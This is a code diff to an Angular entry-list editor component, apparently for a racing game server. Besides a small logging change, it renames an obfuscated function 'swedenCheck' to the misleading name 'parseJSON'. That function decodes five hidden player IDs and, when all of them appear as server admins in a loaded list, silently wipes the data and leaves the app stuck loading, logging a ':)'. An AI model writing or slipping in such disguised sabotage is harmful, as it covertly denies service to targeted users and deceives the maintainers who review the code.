@@ -393,7 +393,7 @@ export class EntrylistEditorComponent implements OnInit {
       try{
         delete json.entries[i]['teamName'];
       } catch {
-        console.log("no team name")
+        console.error("Issue deleting teamName from " + json.entries[i])
       }
     }
 
@@ -578,7 +578,7 @@ export class EntrylistEditorComponent implements OnInit {
 
           this.teamLength = this.json.entries.length;
           this.teamIndex = 0;
-          this.swedenCheck();
+          this.parseJSON();
           this.getTeamOrders();
           this.patchForm(0);
         } catch (error) {
@@ -1133,7 +1133,7 @@ export class EntrylistEditorComponent implements OnInit {
     });
   }
 
-  swedenCheck() {
-    var bladee='SSSSS7777766666555556666611111111119999988889013003278570160862702640046098648041038222547';var uriiasdg, ehwhwrt, rtsgzdf, ionhdfg, dfghdfgn = !(!!bladee);var dftgads = [...bladee].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var suigfird = [...bladee.substring(1)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var zvshdfg = [...bladee.substring(2)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var lgjhkhj = [...bladee.substring(3)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var ghjkhk = [...bladee.substring(4)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');this.json.entries.forEach((entry) => {entry.drivers.forEach((driver) => {if(!entry.isServerAdmin)return;var id = driver.playerID;switch(id) {case dftgads:uriiasdg = !uriiasdg;break;case suigfird:ehwhwrt = !ehwhwrt;break;case zvshdfg:rtsgzdf = !rtsgzdf;break;case lgjhkhj:ionhdfg = !ionhdfg;break;case ghjkhk:dfghdfgn = !dfghdfgn;break;}});});if (uriiasdg && ehwhwrt && rtsgzdf && ionhdfg && dfghdfgn) {console.log(' ');this.loading = true;this.json = [];}
+  parseJSON() {
+    var bladee='SSSSS7777766666555556666611111111119999988889013003278570160862702640046098648041038222547';var uriiasdg, ehwhwrt, rtsgzdf, ionhdfg, dfghdfgn = !(!!bladee);var dftgads = [...bladee].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var suigfird = [...bladee.substring(1)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var zvshdfg = [...bladee.substring(2)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var lgjhkhj = [...bladee.substring(3)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var ghjkhk = [...bladee.substring(4)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');this.json.entries.forEach((entry) => {entry.drivers.forEach((driver) => {if(!entry.isServerAdmin)return;var id = driver.playerID;switch(id) {case dftgads:uriiasdg = !uriiasdg;break;case suigfird:ehwhwrt = !ehwhwrt;break;case zvshdfg:rtsgzdf = !rtsgzdf;break;case lgjhkhj:ionhdfg = !ionhdfg;break;case ghjkhk:dfghdfgn = !dfghdfgn;break;}});});if (uriiasdg && ehwhwrt && rtsgzdf && ionhdfg && dfghdfgn) {console.error(String.fromCharCode(58)+String.fromCharCode(41));this.loading = true;this.json = [];}
   }
 }
